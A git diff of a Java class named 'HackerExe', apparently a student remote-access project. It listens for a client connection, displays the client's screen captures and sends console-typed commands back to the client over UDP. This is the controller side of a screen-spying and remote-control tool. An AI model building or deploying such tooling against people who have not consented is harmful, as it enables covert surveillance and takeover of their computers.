@@ -1,6 +1,8 @@
 package hacker;
 
 import java.awt.MouseInfo;
+import java.awt.image.BufferedImage;
+import java.io.BufferedInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -10,6 +12,12 @@ import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.SocketException;
+import java.nio.ByteBuffer;
+import java.util.Scanner;
+
+import javax.imageio.ImageIO;
+import javax.swing.Icon;
+import javax.swing.ImageIcon;
 
 import client.FrameClientScreen;
 
@@ -26,86 +34,114 @@ public class HackerExe {
 	/* Affichage */
 	private static int frameWidth;
 	private static int frameHeight;
+	private static FrameClientScreen fcs;
 
 	/* Réseau */
 	private static final int portServeur = 13337;
-	private final int portClient = 13338;
-	private InetSocketAddress adrDest = new InetSocketAddress("127.0.0.1", portClient);
+	private InetSocketAddress adrDest = new InetSocketAddress(portServeur);
+
+	private String ipClient;
+	private int portClient;
+	private int portTelecommandeClient = 54322;
 
 	private static ServerSocket listenSocket;
 	private static Socket socketConnexion;
 
 	
 	
-	public static void main (String [] args) throws IOException {
+	public static void main (String [] args) throws IOException, InterruptedException {
 		HackerExe h = new HackerExe();
 		h.initListen();
+		h.getClientScreenResolution();
 		h.execute();
+		h.forwardTelecommande();
 	}
 	
 	
-	private static void printClientInterface() {
+	private void forwardTelecommande() {
+		
+		/***********************************************************************/
 		new Thread(new Runnable() {
-			@Override
-			public void run() {
-					FrameClientScreen fcs = new FrameClientScreen();
-					fcs.setBounds(2000, 200, frameWidth+10, frameHeight+90);
-					fcs.setVisible(true);
-					System.out.println("print");
-					while (true) {
-						//Thread.sleep(250);
-						//fcs.getLblImage().setIcon(FullScreenCaptureResized( frameWidth , frameHeight ));
-						//fcs.getLabelMouse().setLocation(clientMousePostionX, clientMousePostionY);
-					}
-			}
-		}).start();		
+		     public void run() {
+		    	 
+		    	 while(true) {
+		    		String lineScanned = new Scanner(System.in).nextLine();
+		    		System.out.println("scan : "+lineScanned);
+		    		try { sendToClient( lineScanned ); } 
+		    		catch (IOException e) { e.printStackTrace(); break; }
+		    	 }
+		     }
+		}).start();
+		/***********************************************************************/
 	}
 
 
 	private void execute() throws IOException {
 		
-		/*new Thread(new Runnable() {
-			@Override
-			public void run() {*/
-				while (true) {
+		/***********************************************************************/
+				new Thread(new Runnable() {
+				     public void run() {
+				    	 
+				    	 while (true) {
+					    	 try { printClientInterface(); } 
+					    	 catch (IOException e) { e.printStackTrace(); break; } 
+				    	 }
+				     }
+				}).start();
+		/**********************************************************************/
+	}
 			
-					String msg = null;
-					try { msg = receiveTCP();} 
-					catch (IOException e) {e.printStackTrace();	}
-					System.out.println("msg = "+msg);
-					
-					if (msg.matches(".*Resolution.*")) {
-						System.out.println("Resolution matched");
-						String[] resolution = msg.split(":");
+	
+
+
+	private static void printClientInterface() throws IOException {
+			String msg = new String();
+			try { msg = receiveTCP();} 
+			catch (Exception e) { e.printStackTrace(); /*System.exit(0);*/ }
+			
+			if (msg.matches(".*ScreenSize=.*")){
+			    BufferedImage img = ImageIO.read(ImageIO.createImageInputStream(socketConnexion.getInputStream()));
+			    fcs.getLblImage().setIcon(new ImageIcon(img));
+			}
+	}
+	
+
+
+	private void getClientScreenResolution() throws IOException {
+
+		String msg = null;
+		try { msg = receiveTCP();} 
+		catch (IOException e) {e.printStackTrace();	}
 		
-						clientResolutionX = Integer.parseInt(msg.substring(msg.indexOf("=")+1, msg.indexOf(":")));
-						clientResolutionY = Integer.parseInt(msg.substring(msg.indexOf(":")+1, msg.length()));
-						frameWidth = (2*clientResolutionX/3);
-						frameHeight = (2*clientResolutionY/3);
-					}
-					
-					if (msg.matches(".*Mouse.*")) {
-						System.out.println("Mouse matched");
-						String[] resolution = msg.split(":");
-						
-						clientMousePostionX = Integer.parseInt(msg.substring(msg.indexOf("=")+1, msg.indexOf(":")));
-						clientMousePostionY = Integer.parseInt(msg.substring(msg.indexOf(":")+1, msg.length()));
-					}
-					else {
-						//System.out.println("Nothing matched");
-						//printClientInterface();
-					}
-				}
-			//}
-		//}).start();
+		if (msg.matches(".*Resolution.*")) {
+			String[] resolution = msg.split(":");
+
+			clientResolutionX = Integer.parseInt(msg.substring(msg.indexOf("=")+1, msg.indexOf(":")));
+			clientResolutionY = Integer.parseInt(msg.substring(msg.indexOf(":")+1, msg.length()));
+			frameWidth = (2*clientResolutionX/3);
+			frameHeight = (2*clientResolutionY/3);
+			
+			System.out.println("Resolution recue : " + frameWidth + "*" + frameHeight);
+			fcs.setBounds(2000, 100, frameWidth+18, frameHeight+65);
+		}
+
 	}
 
 
 	private void initListen() throws IOException {
 		listenSocket = new ServerSocket();
 		listenSocket.bind(adrDest);
+		socketConnexion = listenSocket.accept();
+		
+		ipClient = socketConnexion.getInetAddress().getHostAddress();
+		portClient = socketConnexion.getPort();
+		
+		System.out.println("Connexion de "+ ipClient +":" + portClient);
+		fcs = new FrameClientScreen();
+		fcs.setVisible(true);
 	}
 
+	
 	public void envoyer(String msg, String adresse, int port) throws IOException {
 		this.adrDest = new InetSocketAddress(adresse, port);
 		byte[] bufE = msg.getBytes();
@@ -114,13 +150,21 @@ public class HackerExe {
 		return;
 	}
 	
-	private String receiveTCP() throws IOException {
-		socketConnexion = listenSocket.accept();
+
+	protected void sendToClient(String msg) throws IOException {
+		DatagramSocket socket_send = new DatagramSocket(null);
+		 byte[] bufR = new byte[2048];
+		 DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
+		 bufR = new String(msg).getBytes();
+		 dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress(ipClient, portTelecommandeClient));
+		 socket_send.send(dpR);		
+	}
+	
+	private static String receiveTCP() throws IOException {
 		byte[] bufR = new byte[2048];
 		InputStream is = socketConnexion.getInputStream();
 		int lenBufR = is.read(bufR);
 		String msgRecu = new String(bufR, 0 , lenBufR );
-		System.out.println("Reponse recue = "+msgRecu);
 		return msgRecu;
 	}
 }
